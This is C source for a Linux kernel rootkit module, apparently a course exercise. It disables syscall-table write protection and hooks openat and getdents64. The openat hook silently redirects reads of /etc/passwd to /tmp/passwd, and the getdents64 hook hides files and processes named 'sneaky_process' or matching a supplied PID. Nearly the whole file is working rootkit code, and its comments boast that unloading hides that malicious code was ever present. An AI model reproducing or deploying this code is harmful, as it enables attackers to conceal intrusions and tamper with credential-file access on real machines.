#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <linux/moduleparam.h>
#include<linux/slab.h>

#define PREFIX "sneaky_process"

MODULE_AUTHOR("Zhigang Wei");
static char *pid = "";
module_param(pid, charp,0);
MODULE_PARM_DESC(pid,
"Process id of this sneaky program");

struct linux_dirent64 {
    u64 d_ino;    /* 64-bit inode number */
    s64 d_off;    /* 64-bit offset to next structure */
    unsigned short d_reclen; /* Size of this dirent */
    unsigned char d_type;   /* File type */
    char d_name[]; /* Filename (null-terminated) */
};

//This is a pointer to the system call table
static unsigned long *sys_call_table;

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr) {
    unsigned int level;
    pte_t *pte = lookup_address((unsigned long) ptr, &level);
    if (pte->pte & ~_PAGE_RW) {
        pte->pte |= _PAGE_RW;
    }
    return 0;
}

int disable_page_rw(void *ptr) {
    unsigned int level;
    pte_t *pte = lookup_address((unsigned long) ptr, &level);
    pte->pte = pte->pte & ~_PAGE_RW;
    return 0;
}

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(struct pt_regs *);
asmlinkage int (*original_getdents64)(struct pt_regs *);

// Define your new sneaky version of the 'openat' syscall
asmlinkage int sneaky_sys_openat(struct pt_regs *regs) {
    // Implement the sneaky part here
//printk(KERN_INFO "[Sneaky_sys_open]\n");
    char *file_path = (char *) regs->si;
    char tem_file_path[20] = "/tmp/passwd";
    if (strcmp(file_path, "/etc/passwd") == 0) {
        copy_to_user((void *) file_path, tem_file_path, sizeof(tem_file_path));
    }
    return (*original_openat)(regs);
}

asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs) {
    printk(KERN_INFO "[Sneaky_sys_getdents64]\n");
    struct linux_dirent64 *td,*td1,*td2,*td3;
    struct linux_dirent64 *dirp = (struct linux_dirent64*)regs->si;
    int number;
    int copy_len = 0;
    // Call sys_getdents64, return the total number of bytes written to the directory
    // under the directory file
    number = original_getdents64(regs);
    if (!number)
        return (number);
    // Allocate kernel space and copy data from user space to kernel space
    // GFP_KERNEL: The current process waits for a page by hibernating with less memory
    td2 = (struct linux_dirent64 *) kmalloc(number, GFP_KERNEL);
    td1 = (struct linux_dirent64 *) kmalloc(number, GFP_KERNEL);
    td = td1;
    td3 = td2;
    // *td2 is a pointer to kernel space, *dirp is a pointer to user space,
    // and n indicates the number of bytes of data to be copied from user space to kernel space.
    copy_from_user(td2, dirp, number);

    while(number>0){
        number = number - td2->d_reclen;
        //printk("%s\n",td2->d_name);
        if(strstr(td2->d_name,"sneaky_process") == NULL &&
                strstr(td2->d_name, pid) == NULL){
            //Copy td2->dreclen bytes from the memory area referred to by td2 to the td1 area
            memmove(td1, (char *) td2 , td2->d_reclen);
            td1 = (struct linux_dirent64 *) ((char *)td1 + td2->d_reclen);
            copy_len = copy_len + td2->d_reclen;
        }
        td2 = (struct linux_dirent64 *) ((char *)td2 + td2->d_reclen);
    }
    copy_to_user(dirp, td, copy_len);
    kfree(td);
    kfree(td3);
    return (copy_len);
}

//asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs) {
//    printk(KERN_INFO "[Sneaky_sys_getdents64]\n");
//    struct linux_dirent64 *dirp = (struct linux_dirent64*)regs->si;
//    int buf_len, record_len, modify_buf_len;
//    struct linux_dirent64 *dirp2, *dirp3, *head = NULL, *prev = NULL;
//    char hide_sneaky[] = "sneaky_process";
//    buf_len = original_getdents64(regs);
//    if (buf_len <= 0) return buf_len;
//    dirp2 = (struct linux_dirent64 *) kmalloc(buf_len, GFP_KERNEL);
//    if (dirp2) return buf_len;
//    if (copy_from_user(dirp2, dirp, buf_len)) {
//        printk("fail to copy dirp tp dirp2 \n");
//        return buf_len;
//    }
//    head = dirp2;
//    prev = dirp3;
//    modify_buf_len = buf_len;
//    while (((int) dirp3) < (((int) dirp2) + buf_len)) {
//        record_len = dirp3->d_reclen;
//        if (record_len == 0)
//            break;
//        if (strncmp(dirp3->d_name, hide_sneaky, strlen(hide_sneaky)) == 0 ||
//            strncmp(dirp3->d_name, pid, strlen(pid)) == 0) {
//            printk("Found the sneaky_process \n");
//            if (!prev) {
//                head = (struct linux_dirent64 *) ((char *) dirp3 + record_len);
//                modify_buf_len -= record_len;
//            } else {
//                prev->d_reclen += record_len;
//                memset(dirp3, 0, record_len);
//            }
//        } else {
//            prev = dirp3;
//        }
//        dirp3 = (struct linux_dirent64 *) ((char *) dirp3 + record_len);
//    }
//    copy_to_user(dirp, head, modify_buf_len);
//    kfree(dirp2);
//    return modify_buf_len;
//}


// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void) {
    // See /var/log/syslog or use `dmesg` for kernel print output
    printk(KERN_INFO
    "Sneaky module being loaded.\n");

    // Lookup the address for this symbol. Returns 0 if not found.
    // This address will change after rebooting due to protection
    sys_call_table = (unsigned long *) kallsyms_lookup_name("sys_call_table");

    // This is the magic! Save away the original 'openat' system call
    // function address. Then overwrite its address in the system call
    // table with the function address of our new code.
    original_openat = (void *) sys_call_table[__NR_openat];
    original_getdents64 = (void *) sys_call_table[__NR_getdents64];

    // Turn off write protection mode for sys_call_table
    enable_page_rw((void *) sys_call_table);

    sys_call_table[__NR_openat] = (unsigned long) sneaky_sys_openat;
    sys_call_table[__NR_getdents64] = (unsigned long) sneaky_sys_getdents64;

    // Turn write protection mode back on for sys_call_table
    disable_page_rw((void *) sys_call_table);

    return 0;       // to show a successful load
}


static void exit_sneaky_module(void) {
    printk(KERN_INFO
    "Sneaky module being unloaded.\n");

    // Turn off write protection mode for sys_call_table
    enable_page_rw((void *) sys_call_table);

    // This is more magic! Restore the original 'open' system call
    // function address. Will look like malicious code was never there!
    sys_call_table[__NR_openat] = (unsigned long) original_openat;
    sys_call_table[__NR_getdents64] = (unsigned long) original_getdents64;

    // Turn write protection mode back on for sys_call_table
    disable_page_rw((void *) sys_call_table);
}


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  
MODULE_LICENSE("GPL");